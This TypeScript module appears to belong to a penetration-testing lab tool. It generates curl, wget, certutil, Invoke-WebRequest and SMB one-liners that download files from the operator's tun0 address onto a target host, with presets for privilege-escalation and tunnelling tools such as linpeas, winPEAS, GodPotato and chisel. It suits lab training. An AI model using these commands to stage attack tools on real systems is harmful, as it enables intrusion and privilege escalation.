import { hostOrIp } from "./scope-target.ts";

export type TransferOs = "linux" | "windows";
export type TransferClient = "curl" | "wget" | "certutil" | "iwr";

const CLIENTS: Record<TransferOs, TransferClient[]> = {
  linux: ["curl", "wget"],
  windows: ["certutil", "iwr"],
};

function hostOk(value: string): boolean {
  const host = hostOrIp(value);
  if (!host) return false;
  if (host === "127.0.0.1" || host === "localhost" || host === "0.0.0.0" || host.startsWith("127.")) return false;
  return true;
}

function safeRel(file: string): { rel: string; base: string } | null {
  const parts = file.trim().split("/").filter((part) => part.length > 0);
  if (parts.length === 0 || parts.length > 4) return null;
  if (parts.some((part) => part === "." || part === ".." || !/^[A-Za-z0-9][A-Za-z0-9._-]{0,80}$/.test(part))) return null;
  const base = parts[parts.length - 1];
  if (!base) return null;
  return { rel: parts.join("/"), base };
}

export function transferPlan(input: {
  host: string;
  port: string;
  file: string;
  os: TransferOs;
  client: TransferClient;
}): { command: string; url: string; why: string } | { error: string } {
  const host = input.host.trim();
  const file = input.file.trim();
  if (!host) return { error: "The address is your tun0 address. 127.0.0.1 is this desk, and the target cannot reach it." };
  if (host === "127.0.0.1" || host === "localhost" || host === "0.0.0.0" || host.startsWith("127.")) {
    return { error: "That address is this desk. The target cannot reach it. Use the tun0 address from ip a." };
  }
  if (!hostOk(host)) return { error: "The address is one IP or one host name." };
  if (!/^\d{1,5}$/.test(input.port) || Number(input.port) < 1 || Number(input.port) > 65535) {
    return { error: "The port is the one serving the uploads folder, usually 80." };
  }
  const port = String(Number(input.port));
  const named = safeRel(file);
  if (!named) return { error: "Pick a file in the uploads folder. The name is letters, numbers, dots, and hyphens. No .." };
  if (!CLIENTS[input.os].includes(input.client)) return { error: "That client does not belong to this operating system." };
  const path = named.rel
    .split("/")
    .map((part) => encodeURIComponent(part))
    .join("/");
  const url = `http://${host}:${port}/${path}`;
  const command =
    input.client === "curl"
      ? `curl -o /tmp/${named.base} ${url}`
      : input.client === "wget"
        ? `wget ${url} -O /tmp/${named.base}`
        : input.client === "certutil"
          ? `certutil -urlcache -split -f ${url} C:\\Users\\Public\\${named.base}`
          : `powershell -c "Invoke-WebRequest ${url} -OutFile C:\\Users\\Public\\${named.base}"`;
  return {
    command,
    url,
    why:
      input.os === "windows"
        ? "Paste this on the Windows host. certutil -urlcache -split -f fetches the URL into that path. IWR is Invoke-WebRequest, and -OutFile is the same save. Then dir the file and compare the size with Kali. A few hundred bytes is an HTML page, not the tool."
        : "Paste this on the Linux host. curl -o and wget -O both write the response to /tmp. Then ls -l on both sides. The sizes match, or the file is an error page. chmod +x only if you are about to run a binary.",
  };
}

const WINDOWS_EXT = new Set(["exe", "ps1", "dll", "bat"]);
const LINUX_EXT = new Set(["sh", "py", "elf"]);

/** An empty name is left alone. Linux for a script, an ELF, or no extension. Windows for exe, ps1, dll, and bat. Unknown extensions are left alone. */
export function transferOsForFile(file: string): TransferOs | null {
  const base = file.trim().split("/").filter((part) => part.length > 0).pop() ?? "";
  if (!base) return null;
  const dot = base.lastIndexOf(".");
  const ext = dot <= 0 ? "" : base.slice(dot + 1).toLowerCase();
  if (ext === "" || LINUX_EXT.has(ext)) return "linux";
  if (WINDOWS_EXT.has(ext)) return "windows";
  return null;
}

export type FileHostNotice = { port: number; listening: boolean };

/** The desk serves one uploads port. Another port is a separate python server. A low port warns only when this host is not listening. */
export function transferPortWarning(port: string, host: FileHostNotice = { port: 80, listening: false }): string | null {
  const text = port.trim();
  if (!/^\d{1,5}$/.test(text)) return null;
  const n = Number(text);
  if (n < 1 || n > 65535) return null;
  if (n !== host.port) {
    return `This desk serves the uploads folder on port ${host.port} only. For port ${n}, run \`python3 -m http.server ${n}\` in the uploads folder.`;
  }
  if (n < 1024 && !host.listening) {
    return "A port below 1024 only works if this desk is running as root. Otherwise the file host cannot bind it, and the target will not get the file.";
  }
  return null;
}

export const TRANSFER_PRESETS = [
  { id: "linpeas", file: "linpeas.sh" },
  { id: "winpeas", file: "winPEASx64.exe" },
  { id: "pspy", file: "pspy64" },
  { id: "godpotato", file: "GodPotato-NET4.exe" },
  { id: "chisel", file: "chisel" },
  { id: "chisel-win", file: "chisel.exe" },
] as const;

/** Every one-liner for the same file. The address is tun0. Nothing is started from here. */
export function transferBundle(input: { host: string; port: string; file: string }): { lines: { label: string; command: string }[] } | { error: string } {
  const labels: { label: string; os: TransferOs; client: TransferClient }[] = [
    { label: "curl", os: "linux", client: "curl" },
    { label: "wget", os: "linux", client: "wget" },
    { label: "certutil", os: "windows", client: "certutil" },
    { label: "iwr", os: "windows", client: "iwr" },
  ];
  const lines: { label: string; command: string }[] = [];
  for (const item of labels) {
    const plan = transferPlan({ ...input, os: item.os, client: item.client });
    if ("error" in plan) return plan;
    lines.push({ label: item.label, command: plan.command });
  }
  const host = input.host.trim();
  const named = safeRel(input.file);
  if (!named) return { error: "Pick a file in the uploads folder." };
  const winPath = named.rel.replaceAll("/", "\\");
  lines.push({
    label: "smb",
    command: `cd uploads && impacket-smbserver desk . -smb2support\ncopy \\\\${host}\\desk\\${winPath} C:\\Users\\Public\\${named.base}`,
  });
  return { lines };
}
